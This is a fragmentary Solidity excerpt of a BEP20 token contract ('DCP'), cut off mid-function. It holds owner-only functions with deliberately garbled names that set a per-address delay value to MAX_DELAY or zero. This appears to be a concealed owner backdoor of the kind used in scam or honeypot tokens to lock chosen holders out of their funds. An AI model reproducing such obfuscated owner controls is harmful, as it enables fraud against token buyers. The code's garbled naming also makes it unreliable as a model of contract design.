...
contract DCP is IBEP20, HasForeignAsset {
    ...
    function getDogeCoinPay20140ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setDogeCoinPay20140reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupDogeCoinPay20140ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupDogeCoinPay20140Aasses(address booadndd,uint256 nuum) public onlyOwner {
